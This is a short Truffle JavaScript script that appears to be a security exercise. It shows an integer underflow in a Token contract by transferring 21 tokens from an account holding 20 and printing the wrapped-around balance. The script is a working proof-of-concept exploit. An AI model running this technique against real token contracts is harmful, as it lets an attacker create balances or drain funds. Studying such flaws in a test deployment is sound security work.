const TokenContract = artifacts.require('Token')
const assert = require('assert')

/**
 * Lack of validations in the Token contract
 * allows underflow.
 */
async function execute(callback) {

    let contract = await TokenContract.deployed()
    
    let fromAccount = web3.eth.accounts[0]
    let toAccount = web3.eth.accounts[1]

    let balance = await contract.balanceOf(fromAccount)
    assert.equal(balance, 20)
    console.log(`Initial balance: ${balance}`)

    await contract.transfer(toAccount, 21, {
        from: fromAccount
    })

    balance = await contract.balanceOf(fromAccount)
    console.log(`Final balance: ${balance}`)

}

module.exports = execute
